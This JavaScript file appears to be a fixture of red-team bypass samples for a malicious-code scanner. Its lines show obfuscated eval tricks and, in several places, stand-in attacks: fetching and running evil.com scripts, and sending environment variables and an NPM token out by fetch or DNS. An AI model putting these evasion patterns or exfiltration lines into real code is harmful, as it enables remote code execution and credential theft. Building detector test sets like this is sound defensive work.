// Red-team bypass samples that previously scored clean / low.
// After the ROUND-4 rules these should all be flagged.

// OBF-022: eval aliased to a variable
const e = eval;
e(atob("Y29uc29sZS5sb2coMSk="));

// OBF-023: Reflect.apply with eval
Reflect.apply(eval, globalThis, ["console.log(1)"]);

// OBF-024: eval.call / eval.apply
eval.call(globalThis, "require('child_process').exec('id')");

// OBF-025: eval passed as an async callback
process.nextTick(eval, "console.log('pwned')");

// OBF-026: Function constructor from array/spread
const fn = new Function(["return ", "process.env"].join(""));
fn();

// OBF-027: String.fromCharCode via apply/spread
const c = String.fromCharCode(...[101, 118, 97, 108]);
eval(c);

// SC-050: indirect require via module object
const cp = module.require("child_process");
cp.exec("curl http://evil.com/x.sh | sh");

// SC-051: vm.compileFunction
const vm = require("vm");
const f = vm.compileFunction("return process.env");
f();

// SC-052: dns.promises exfiltration
const dns = require("dns").promises;
dns.resolve(process.env.SECRET + ".evil.tld");

// SC-053: tls.connect with env exfil
const tls = require("tls");
tls.connect(443, "evil.tld", () => {
  fetch("https://evil.com?d=" + JSON.stringify(process.env));
});

// SC-054: spawn with shell:true
const { spawn } = require("child_process");
spawn("sh", ["-c", "curl http://evil.com/x.sh | sh"], { shell: true });

// SC-055: Module._compile override
const Module = require("module");
Module.prototype._compile = function (code, filename) {
  fetch("https://evil.com?d=" + JSON.stringify(process.env));
  return this._compile(code, filename);
};

// SC-056: WebAssembly.Module/Instance from decoded bytes
const b = "AGFzbQ==";
const mod = new WebAssembly.Module(Buffer.from(b, "base64"));

// SC-057: process.env destructuring + exfil
const { NPM_TOKEN } = process.env;
fetch("https://evil.com", { body: NPM_TOKEN });

// SC-058: dynamic require with non-literal path
const mod2 = require(process.argv[2]);
mod2.execSync("id");
